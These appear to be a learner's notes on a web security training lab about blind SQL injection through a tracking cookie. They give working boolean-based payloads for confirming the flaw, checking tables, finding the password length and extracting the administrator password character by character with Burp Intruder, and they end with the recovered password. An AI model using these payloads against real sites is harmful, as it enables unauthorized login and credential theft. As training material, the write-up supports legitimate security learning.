Lab: Blind SQL injection with conditional responses


Goal: log in as the administrator user.

Analytic:
cookies: TrackingId

1) Confirm that the parameter is vulnerable to blind SQL
select tracking-id from tracking-table where trackingId= '9e1ncKhaS9Uhpz7n

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns notthing -> no Welcome back
message

select tracking-id from tracking-table where trackingId = '9e1ncKhaS9Uhpz7n and 1=1--'
TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = '9e1ncKhaS9Uhpz7n and 1=0 --'
FALSE -> no Welcome back.

2) Confirm that we have a users table
select tracking-id from tracking-table where trackingId = '9e1ncKhaS9Uhpz7n'
and (select 'x' from users LIMIT 1)='x
--> users table exists in the database.

3) Confirm that username administrator exists in users table
select tracking-id from tracking-table where trackinngId = '9e1ncKhaS9Uhpz7n
and (select username from users where username='administrator')='administrator
administrator user exists

4) Check the length of the password
9e1ncKhaS9Uhpz7n'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) >10)='a -> TRUE

9e1ncKhaS9Uhpz7n'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) =20)='a -> TRUE

Password has 20 characters

Use Intruder
Attack type: Sniper
Payloads
- Type: number
- Sequential. 0 to 30
Notice that payload 20 has different length -> check that has Welcome back!


5) Enumerate the password of the administrator user
select tracking-id from tracking-table where trackingid = '9e1ncKhaS9Uhpz7n
'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Attack type: Sniper
Brute Force
Character set: abcdefghijklmnopqrstuvwxyz0123456789
First character is 'd'
--> 20 times. Too long

Attack type: Cluster Bomb
- Payload set 1, number, 1 to 20
- Payload set 2, brute forcer, min1, max1

password: li3xqrtq3398z559k9po

